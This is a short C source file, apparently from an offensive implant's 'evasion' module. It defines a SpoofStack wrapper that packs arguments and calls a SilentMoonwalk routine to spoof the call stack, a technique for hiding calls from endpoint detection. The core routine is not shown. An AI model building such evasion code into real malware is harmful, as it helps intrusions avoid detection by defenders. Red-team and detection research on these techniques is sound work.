//
// Created by Brendan Ortiz on 7/25/2024.
//

#include "../../../headers/agent/evasion/Common.h"

PVOID SpoofStack(
    _In_ PVOID pFunction,
    _In_ INT Nargs,
    _Inout_ PVOID a,
    _Inout_ PVOID b,
    _Inout_ PVOID c,
    _Inout_ PVOID d,
    _Inout_ PVOID e,
    _Inout_ PVOID f,
    _Inout_ PVOID g,
    _Inout_ PVOID h,
    _Inout_ PVOID j
   )
{
    Args args = {0};
    args.Nargs = Nargs;
    args.Arg01 = a;
    args.Arg02 = b;
    args.Arg03 = c;
    args.Arg04 = d;
    args.Arg05 = e;
    args.Arg06 = f;
    args.Arg07 = g;
    args.Arg08 = h;
    args.Arg09 = j;


    return SilentMoonwalkMain(pFunction, &args, agent->Walker->RetAddr);
}